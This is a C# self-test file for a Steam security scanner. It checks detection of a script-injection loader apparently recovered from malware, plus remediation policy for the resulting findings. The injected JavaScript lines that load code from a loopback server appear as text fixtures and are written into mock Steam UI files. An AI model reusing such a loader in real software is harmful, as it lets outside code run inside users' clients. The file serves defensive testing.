using System.IO;
using System.Text.Json;
using SteamSentinel.Core.Inspection;
using SteamSentinel.Core.Models;
using SteamSentinel.Core.Remediation;
using SteamSentinel.Core.Reporting;
using SteamSentinel.Core.Scanning;
using SteamSentinel.Core.Steam;
using SteamSentinel.Core.Utilities;

namespace SteamSentinel.SelfTest;

internal static partial class Program
{
    private static async Task TestPawnshopSteamUiAsync(string root)
    {
        // Literal patch strings recovered from the resident. These JS fixtures are read as text only.
        const string patch = """;try{var s=document.createElement("script");s.src="http://127.0.0.1:8137/x.js";document.head.appendChild(s)}catch{}""";
        const string datedPatch = """;try{var s=document.createElement("script");s.src="http://127.0.0.1:8137/x.js?"+Date.now();document.head.append(s)}catch{}""";
        const string legacySignals = "class C {BMustShowSupportAlertDialog(){return false;} BHasActiveSupportAlerts(){return true;}}";
        Check("SteamAlert UI accepts both observed script loaders", SteamUiLoopbackInspector.Find(patch)?.MatchesSteamAlertEndpoint == true &&
            SteamUiLoopbackInspector.Find(datedPatch)?.MatchesSteamAlertEndpoint == true);
        string alternative = patch.Replace("127.0.0.1:8137/x.js", "[::1]:9999/other.js?key=private");
        LoopbackScriptReference? loopback = SteamUiLoopbackInspector.Find(alternative);
        Check("Steam UI recognizes independent loopback loaders and omits query data", loopback is { MatchesSteamAlertEndpoint: false } &&
            loopback.Endpoint == "http://[::1]:9999/other.js" && SteamUiLoopbackInspector.Find(alternative + patch)?.MatchesSteamAlertEndpoint == true);
        Check("Steam UI requires creation, assignment and insertion of the same local script", new[]
        {
            "fetch('http://127.0.0.1:8137/x.js')", "const args = '-cef-enable-debugging';",
            "// " + patch, "/* " + patch + " */", "const example = '" + patch + "'",
            patch.Replace("appendChild(s)", "appendChild(other)"), patch.Replace("s.src=", "other.src="),
            patch.Replace("127.0.0.1", "localhost.example"), patch.Replace("127.0.0.1", "user@localhost"),
            patch.Replace("createElement(\"script\")", "createElement(\"img\")")
        }.All(value => SteamUiLoopbackInspector.Find(value) is null));
        foreach (string behaviorRule in new[] { SteamSecurityScanner.LoopbackRuleId, "MANAGED-MOD-DOWNLOAD-LAUNCH", "MANAGED-STEAM-CEF-HOST", "MANAGED-STEAM-CEF-CORE" })
        {
            Finding imported = new()
            {
                RuleId = behaviorRule,
                CanRemediate = true,
                IsKnownMalware = true,
                SuggestedActions = [SuggestedActionKind.QuarantineFile]
            };
            Check("SteamAlert review-only policy overrides saved action flags: " + behaviorRule,
                !FindingHandlingPresentation.Get(imported).CanSelect && !RemediationEvidencePolicy.CanRemediate(imported) &&
                RemediationEvidencePolicy.ReviewOnlyMessage(imported).Message?.MessageId != RemediationEvidencePolicy.ReviewOnlyMessageId &&
                await RejectsPlanAsync([imported]));
        }

        string fixture = Path.Combine(root, "steamalert-ui-" + Guid.NewGuid().ToString("N"));
        string steam = Path.Combine(fixture, "Steam");
        string scripts = Path.Combine(steam, "steamui");
        Directory.CreateDirectory(scripts);
        string chunk = Path.Combine(scripts, "chunk-fixture.js");
        await File.WriteAllTextAsync(chunk, datedPatch + legacySignals);
        await File.WriteAllTextAsync(Path.Combine(scripts, "local-extension.js"), alternative);
        await File.WriteAllTextAsync(Path.Combine(scripts, "reference.js"), "/* " + patch + " */");
        SteamLayout layout = new();
        layout.SteamRoots.Add(steam);
        ScanReport report = new();
        await new SteamSecurityScanner(new RuleSet()).ScanAsync(layout, report);
        Finding exact = report.Findings.Single(f => f.RuleId == SteamSecurityScanner.LoopbackRuleId && f.Target == chunk);
        Check("Steam UI observations retain the file hash and leave the client chunk in place", exact.Score == 55 &&
            exact.Sha256 == await Hashing.Sha256FileAsync(chunk) && report.Findings.Count(f => f.RuleId == SteamSecurityScanner.LoopbackRuleId) == 2 &&
            report.Findings.Where(f => f.Target == chunk).All(f => !FindingHandlingPresentation.Get(f).CanSelect &&
                !f.SuggestedActions.Contains(SuggestedActionKind.QuarantineFile)) &&
            await RejectsPlanAsync(report.Findings));

        string local = Path.Combine(fixture, "LocalAppData");
        string resident = Path.Combine(local, "SteamAlertDemo", "Application Frame Host.exe");
        Directory.CreateDirectory(Path.GetDirectoryName(resident)!);
        await File.WriteAllTextAsync(resident, "Inert resident hash fixture. Never executed.");
        string hash = await Hashing.Sha256FileAsync(resident);
        RuleSet family = new() { KnownHashes = [new() { Id = "STEAMALERT-RESIDENT", Sha256 = hash, Malware = true }] };
        Finding proof = Resident(resident, resident);
        Finding Resident(string target, string content) => new()
        {
            RuleId = "STEAMALERT-RESIDENT",
            Category = FindingCategory.File,
            IsKnownMalware = true,
            Sha256 = hash,
            TargetSha256 = hash,
            Target = target,
            ContentPath = content
        };
        ScanReport wrongSource = new()
        {
            Findings = [exact, Resident(resident, resident + "!/payload.exe"),
            Resident(Path.Combine(fixture, "archive-copy.exe"), Path.Combine(fixture, "archive-copy.exe"))]
        };
        SteamSecurityScanner.CorrelateLoopbackScripts(wrongSource, family, local);
        Check("Steam UI attribution excludes archive members and unrelated copies", ReferenceEquals(wrongSource.Findings[0], exact));
        Finding reloaded = JsonSerializer.Deserialize<Finding>(JsonSerializer.Serialize(exact))!;
        ScanReport importedReport = new() { Findings = [reloaded, proof] };
        SteamSecurityScanner.CorrelateLoopbackScripts(importedReport, family, local);
        Check("Steam UI serialized observation cannot create fresh local attribution", ReferenceEquals(importedReport.Findings[0], reloaded));
        ScanReport foreign = new() { MachineName = "not-this-machine-" + Environment.MachineName, Findings = [proof] };
        ScanReport mixed = ScanReportMerger.Merge(report, foreign);
        ScanReport mixedAgain = ScanReportMerger.Merge(mixed, new ScanReport());
        SteamSecurityScanner.CorrelateLoopbackScripts(mixedAgain, family, local);
        Check("Steam UI attribution excludes mixed-machine and mixed-user reports",
            mixedAgain.Findings.All(f => f.ReasonCode != "SteamAlertResidentCorrelated") &&
            !SteamSecurityScanner.IsCurrentUserReport(ScanReportMerger.Merge(report,
                new ScanReport { UserName = "not-this-user-" + Environment.UserName })));

        report.Findings.Add(proof);
        SteamSecurityScanner.CorrelateLoopbackScripts(report, family, local);
        SteamSecurityScanner.CorrelateLoopbackScripts(report, family, local);
        Finding correlated = report.Findings.Single(f => f.Id == exact.Id);
        Check("SteamAlert exact live resident corroborates only the observed endpoint and preserves review-only handling",
            correlated.ReasonCode == "SteamAlertResidentCorrelated" && correlated.Severity == FindingSeverity.High &&
            !correlated.IsKnownMalware && !FindingHandlingPresentation.Get(correlated).CanSelect &&
            correlated.SuggestedActions.SequenceEqual([SuggestedActionKind.ReviewOnly]) &&
            report.Findings.Single(f => f.RuleId == exact.RuleId && f.Target != chunk).Severity == FindingSeverity.Low &&
            await RejectsPlanAsync([correlated]));
        await File.WriteAllTextAsync(chunk, "/* Repaired inert Steam chunk. */");
        ScanReport repaired = new() { Findings = [exact, proof] };
        SteamSecurityScanner.CorrelateLoopbackScripts(repaired, family, local);
        Check("SteamAlert UI rejects a changed Steam script even with a matching live resident", ReferenceEquals(repaired.Findings[0], exact));
        await File.WriteAllTextAsync(chunk, datedPatch + legacySignals);
        await File.WriteAllTextAsync(resident, "Changed inert fixture.");
        ScanReport stale = new() { Findings = [exact, proof] };
        SteamSecurityScanner.CorrelateLoopbackScripts(stale, family, local);
        Check("SteamAlert UI rejects stale resident identities", ReferenceEquals(stale.Findings[0], exact));

        static async Task<bool> RejectsPlanAsync(IEnumerable<Finding> findings)
        {
            try { await new RemediationPlanBuilder(new RuleSet()).BuildAsync(findings, false, requestExplicitFileTargets: true); }
            catch (RemediationEvidenceException ex) { return ex.ReasonCode == RemediationEvidencePolicy.BehaviorReviewReasonCode; }
            return false;
        }
    }
}
